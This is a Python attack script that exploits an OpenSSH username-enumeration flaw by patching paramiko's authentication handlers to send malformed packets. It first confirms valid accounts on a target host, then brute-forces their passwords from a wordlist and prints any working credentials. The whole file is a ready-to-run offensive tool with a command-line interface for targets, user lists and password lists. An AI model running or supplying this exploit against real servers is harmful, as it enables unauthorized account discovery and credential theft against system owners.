#!/usr/bin/env python3
import argparse
import paramiko
import sys
import os
import socket
import logging
import string
import json
from colorama import Fore, Style
from random import randint as rand
from random import choice as choice

global hostname, username, port, password_file

def exploit(hostname, username, port, validuser = ""):
    # store function we will overwrite to malform the packet
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]


    # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
    # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
    random_username_list = []
    # populate the list
    for i in range(3):
        user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
        random_username_list.append(user)


    # create custom exception
    class BadUsername(Exception):
        def __init__(self):
            pass

    # create malicious "add_boolean" function to malform packet
    def add_boolean(*args, **kwargs):
        pass
        
    # create function to call when username was invalid
    def call_error(*args, **kwargs):
        raise BadUsername()

    # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
    def malform_packet(*args, **kwargs):
        old_add_boolean = paramiko.message.Message.add_boolean
        paramiko.message.Message.add_boolean = add_boolean
        result  = old_parse_service_accept(*args, **kwargs)
        #return old add_boolean function so start_client will work again
        paramiko.message.Message.add_boolean = old_add_boolean
        return result
        
    # assign functions to respective handlers and add a backup
    old_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
    old_USERAUTH_FAILURE = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE]
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

    # get rid of paramiko logging
    ######CHECK WHAT THIS DOES, IS IT REDUNDANT?#######
    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    # create function to perform authentication with malformed packet and desired username
    def checkUsername(username, tried=0):
        sock = socket.socket()
        sock.connect((hostname, port))
        # instantiate transport
        transport = paramiko.transport.Transport(sock)
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print("supposed exception"+ Style.RESET_ALL)
            # server was likely flooded, retry up to 3 times
            transport.close()
            if tried < 4:
                tried += 1
                return checkUsername(username, tried)
            else:
                print('[-] Failed to negotiate SSH transport'+ Style.RESET_ALL)
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
        except BadUsername:
                return (username, False)
                
        except paramiko.ssh_exception.AuthenticationException:
                return (username, True)
                
        #Successful auth(?)
        raise Exception("There was an error. Is this the correct version of OpenSSH?"+ Style.RESET_ALL)
    
    # function to test target system using the randomly generated usernames
    def checkVulnerable():
        vulnerable = True
        for user in random_username_list:
            result = checkUsername(user)
            if result[1]:
                vulnerable = False
        return vulnerable

    sock = socket.socket()
    try:
        sock.connect((hostname, port))
        sock.close()
    except socket.error:
        print('[-] Connecting to host failed. Please check the specified host and port.'+ Style.RESET_ALL)
        sys.exit(1)

    # first we run the function to check if host is vulnerable to this CVE
    if not checkVulnerable():
        # most probably the target host is either patched or running a version not affected by this CVE
        print("[-] Target host most probably is not vulnerable or already patched, exiting..."+ Style.RESET_ALL)
        sys.exit(0)
    elif username:
        result = checkUsername(username)
        if result[1]:
            print(Fore.BLUE+ "[+] User: " + result[0]+" => is a valid user" + Style.RESET_ALL)
            validuser = (result[0])
        elif args.suppress == False:
            print(Fore.YELLOW+ "[*] User: " + result[0]+" => is not a valid user" + Style.RESET_ALL)

    
    #Restore Paramiko to defaults
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] =  old_SERVICE_ACCEPT
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_USERAUTH_FAILURE

    #Return valid username
    return(validuser)
    


def ssh_connect(hostname, port, username, password, code = 0):
    ssh2 = paramiko.SSHClient()
    ssh2.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh2.connect(hostname, port, username, password)
    except paramiko.AuthenticationException:
        #[-] Authentication Failed ...
        code = 1
    except socket.error as e:
        #[-] Connection Failed ... Host Down
        code = 2
    
    ssh2.close()
    return code


try:

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
    group = arg_parser
    arg_parser.add_argument('--port', type=int, default=22, help="The target port (Default 22)")
    arg_parser.add_argument('--suppress', type=bool, default=False, help="Suppresses unsuccessful usernames or passwords")
    group = arg_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--username', type=str, help="A Single Usename to Enumerate")
    group.add_argument('--userfile', type=str, help="The list of usernames (one per line) to enumerate through")
    group = arg_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--password', type=str, help="A Single Password to Enumerate")
    group.add_argument('--passfile', type=str, help="The list of passwords (one per line) to enumerate through")

    args = arg_parser.parse_args()

    print(Fore.CYAN+"""\
        
      SSH User or Password Enmeration  

,adPPYba, 88       88  ,adPPYba,  8b,dPPYba,   ,adPPYba,  
I8[    "" 88       88 a8"     "8a 88P'    "8a a8P_____88      
 `"Y8ba,  88       88 8b       d8 88       d8 8PP"""""""
aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa 
`"YbbdP"'  `"YbbdP'Y8  `"YbbdP"'  88`YbbdP"'   `"Ybbd8"' 
                                  88           
                                  88 
                    V1.0.5
          ASCII Art Credit ascii.co.uk
                                            """)
    
    if args.userfile:
        if os.path.exists(args.userfile) == False:
            print(Fore.RED + "[-] Username Filepath: " +args.userfile  +" Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
            sys.exit(3)
        else:
            lineuser = [line.strip("\n") for line in open(args.userfile,'r')]
    elif args.username:
        lineuser = [args.username]
    if args.passfile:
        if os.path.exists(args.passfile) == False:
            print(Fore.RED + "[-] Password Filepath: " +args.passfile + " Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
            sys.exit(3)
        else:
            linepassword = [line.strip("\n") for line in open(args.passfile,'r')]
    elif args.password:
        linepassword = [args.password]

    for user in lineuser:
        validuser = exploit(args.hostname, user, args.port)
        if validuser !="":
            for password in linepassword:                             
                try:
                    response = ssh_connect(args.hostname, args.port, validuser, password)                
                    if response == 0:
                        print(Fore.GREEN + "[+] User: %s [+] Pass Found: %s" % (validuser, password)+ Style.RESET_ALL)
                        break
                    elif response == 1 and args.suppress == False:
                        print(Fore.RED + "[/] User: %s [/] Pass: %s => Login Incorrect!!! <=" % (validuser, password)+ Style.RESET_ALL)  
                    elif response == 2:
                        print("[-] Connnection could not be established to the address: %s" % (args.hostname))
                        sys.exit(2)
                except Exception as ex:
                    print (ex)
                    pass            
except KeyboardInterrupt:
    print("\n\n[-] User Requested An Interupt. Exiting Now..."+ Style.RESET_ALL)
    sys.exit(4)